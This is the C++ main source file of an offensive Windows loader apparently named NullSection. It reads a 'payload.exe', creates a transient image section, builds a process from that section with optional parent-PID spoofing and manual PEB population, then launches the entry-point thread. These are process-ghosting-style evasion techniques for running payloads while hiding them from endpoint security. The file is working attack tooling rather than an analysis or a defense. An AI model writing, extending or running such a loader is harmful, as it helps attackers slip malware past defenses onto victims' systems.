#include "core/nt_api.hpp"
#include "image/pe_parser.hpp"
#include "image/section_builder.hpp"
#include "process/peb_builder.hpp"
#include "process/process_factory.hpp"
#include "process/thread_launcher.hpp"
#include "utils/exceptions.hpp"
#include "utils/handle.hpp"
#include "utils/logging.hpp"
#include <filesystem>
#include <fstream>
#include <iostream>
#include <string>
#include <vector>

using namespace nullsection;

void PrintBanner() {
  std::cout << R"(
  _   _       _ _ ____            _   _             
 | \ | |_   _| | / ___|  ___  ___| |_(_) ___  _ __  
 |  \| | | | | | \___ \ / _ \/ __| __| |/ _ \| '_ \ 
 | |\  | |_| | | |___) |  __/ (__| |_| | (_) | | | |
 |_| \_|\__,_|_|_|____/ \___|\___|\__|_|\___/|_| |_|
                                                     
 Advanced Native Image Execution Framework
)" << std::endl;
}

int main(int argc, char *argv[]) {
  PrintBanner();

  if (argc < 2) {
    std::cout << "Usage: nullsection.exe run --image <payload.exe> "
                 "[--manual-peb] [--ppid <pid>]"
              << std::endl;
    return 1;
  }

  std::string command = argv[1];
  if (command == "run") {
    std::wstring imagePath;
    bool manualPeb = false;
    DWORD ppid = 0;

    for (int i = 2; i < argc; ++i) {
      std::string arg = argv[i];
      if (arg == "--image" && i + 1 < argc) {
        std::string pathStr = argv[++i];
        imagePath = std::wstring(pathStr.begin(), pathStr.end());
      } else if (arg == "--manual-peb") {
        manualPeb = true;
      } else if (arg == "--ppid" && i + 1 < argc) {
        ppid = std::stoul(argv[++i]);
      }
    }

    if (imagePath.empty()) {
      utils::Logger::Log(utils::LogLevel::ERROR, "No image path provided.");
      return 1;
    }

    try {
      utils::Logger::Log(utils::LogLevel::INFO,
                         "Initializing NullSection execution flow...");

      // 1. Resolve NT APIs
      core::NtApi::Instance();
      utils::Logger::Log(utils::LogLevel::DEBUG, "NT APIs resolved.");

      // 2. Parse PE for entry point
      std::ifstream file(imagePath, std::ios::binary | std::ios::ate);
      if (!file.is_open()) {
        throw utils::NullSectionException(
            "Failed to open image file for parsing.");
      }
      size_t fileSize = file.tellg();
      std::vector<char> buffer(fileSize);
      file.seekg(0, std::ios::beg);
      file.read(buffer.data(), fileSize);
      file.close();

      auto headers = image::PeParser::Parse(buffer.data(), fileSize);
      if (!headers) {
        throw utils::NullSectionException("Failed to parse PE headers.");
      }
      DWORD entryPointRva =
          headers->nt_headers->OptionalHeader.AddressOfEntryPoint;
      utils::Logger::Log(utils::LogLevel::DEBUG, "Entry point RVA resolved.");

      // 3. Handle PPID Spoofing
      utils::Handle hParent;
      if (ppid != 0) {
        utils::Logger::Log(utils::LogLevel::INFO,
                           "Spoofing Parent Process ID: " +
                               std::to_string(ppid));
        HANDLE hProc = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, ppid);
        if (!hProc)
          throw utils::Win32Exception(
              "Failed to open parent process for spoofing", GetLastError());
        hParent.Reset(hProc);
      }

      // 4. Create transient section
      utils::Logger::Log(utils::LogLevel::INFO,
                         "Creating transient section...");
      utils::Handle hSection =
          image::SectionBuilder::CreateTransientSection(imagePath);

      // 5. Create process from section
      utils::Logger::Log(utils::LogLevel::INFO, "Creating process object.");
      utils::Handle hProcess =
          process::ProcessFactory::CreateProcessFromSection(hSection, hParent);

      // 6. Manual PEB Population (Advanced Research)
      if (manualPeb) {
        utils::Logger::Log(utils::LogLevel::INFO,
                           "Performing manual PEB population...");
        PROCESS_BASIC_INFORMATION pbi;
        NTSTATUS status = core::NtApi::Instance().NtQueryInformationProcess(
            hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), nullptr);
        if (status == 0) {
          process::PebBuilder::PopulatePeb(hProcess, pbi.PebBaseAddress,
                                           imagePath,
                                           L"\"" + imagePath + L"\"");
          utils::Logger::Log(utils::LogLevel::DEBUG,
                             "Remote PEB populated manually.");
        }
      }

      // 7. Resolve absolute entry point and Launch
      PVOID remoteBase = process::ProcessFactory::GetRemoteImageBase(hProcess);
      PVOID absoluteEntryPoint = (PBYTE)remoteBase + entryPointRva;

      utils::Logger::Log(utils::LogLevel::INFO, "Launching main thread.");
      utils::Handle hThread = process::ThreadLauncher::LaunchMainThread(
          hProcess, absoluteEntryPoint);

      utils::Logger::Log(utils::LogLevel::INFO, "Execution successful.");

    } catch (const std::exception &e) {
      utils::Logger::Log(utils::LogLevel::ERROR,
                         std::string("Execution failed: ") + e.what());
      return 1;
    }
  } else {
    std::cout << "Unknown command: " << command << std::endl;
    return 1;
  }

  return 0;
}
